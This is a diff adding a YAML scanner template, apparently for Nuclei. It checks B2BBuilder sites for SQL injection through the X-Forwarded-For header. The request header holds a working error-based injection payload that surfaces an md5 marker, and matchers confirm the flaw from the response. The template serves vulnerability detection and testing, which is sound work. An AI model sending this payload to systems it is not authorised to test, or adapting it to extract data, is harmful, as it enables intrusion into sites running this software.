@@ -1,0 +1,25 @@
+id: B2BBuilder-sqli
+
+info:
+  name: B2BBuilder 系统X-Forwarded-For SQL注入漏洞
+  author: Str1am
+  severity: high
+  tags: B2BBuilder,sqli
+
+requests:
+  - raw:
+      - |
+        GET /index.php HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-For: 1.1.1.1',(select 1 from (select count(*),concat((Select concat(md5(3.14))),floor(rand(0)*2))x from information_schema.tables group by x)a),1,1)#
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "4beed3b9c4a886067de0e3a094246f781"
+        part: body
+        condition: and
